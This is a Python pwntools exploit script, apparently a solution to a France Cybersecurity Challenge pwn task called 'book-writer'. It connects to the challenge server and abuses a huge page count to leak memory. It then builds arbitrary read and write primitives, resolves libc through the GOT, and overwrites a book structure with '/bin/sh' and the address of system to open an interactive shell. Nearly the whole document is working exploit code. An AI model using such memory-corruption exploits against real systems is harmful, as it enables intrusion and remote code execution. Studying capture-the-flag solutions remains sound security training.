from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./book-writer_patched"
args = []
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    define library
    p (void*[10])library
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2112)

def launch_local():
    global file, io
    pty = process.PTY
    io = process([file, *args], stdin=pty, stdout=pty) # stdin=pty to avoid pwntools messing with the file structures and the heap
    debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")

def exploit():
    def new_book(title, pages):
        sla(b"Quitter\n", b"1")
        sla(b"livre ?\n", title)
        sla(b"pages ?\n", str(pages).encode())

    def open_book(index):
        sla(b"Quitter\n", b"2")
        sla(b"  \n", str(index).encode())

    def next_page():
        sla(b"Quitter\n", b"5")

    def write(data):
        sla(b"Quitter\n", b"3")
        sla(b"crire ? \n", data)

    def read():
        sla(b"Quitter\n", b"4")
        return getb(recvu(b"est ouvert"), b'"', b'"\n"')

    new_book(b"", 0x8000000000000000)
    new_book(b"", 0x8000000000000000)
    new_book(b"", 0x8000000000000000)

    open_book(0)
    leak = read()
    for i in range(0, len(leak), 8):
        print(hex(i), "%#018x" % u64(leak[i:i+8]))

    exe.address = u64(leak[0x20:0x28]) - 0x11e9
    print("exe base: %#018x" % exe.address)

    def read_prim(address):
        open_book(0)
        next_page()
        next_page()
        write(p64(address))
        open_book(2)
        return read()

    def write_prim(address, data):
        open_book(0)
        next_page()
        next_page()
        write(p64(address))
        open_book(2)
        write(data)

    got_start = exe.address + 0x3f78
    leak = read_prim(got_start)
    libc.address = u64(leak[0:8]) - libc.sym["putchar"]

    print("libc: %#018x" % libc.address)

    leak = read_prim(exe.sym["library"])
    second_book_addr = u64(leak[8:0x10])
    write_prim(second_book_addr, b"/bin/sh\0")
    write_prim(second_book_addr + 8, p64(libc.sym["system"]))

    input("shell")

    open_book(1)
    sla(b"Quitter\n", b"3")

    io.interactive()
    input("end")
    exit()

launch()
exploit()
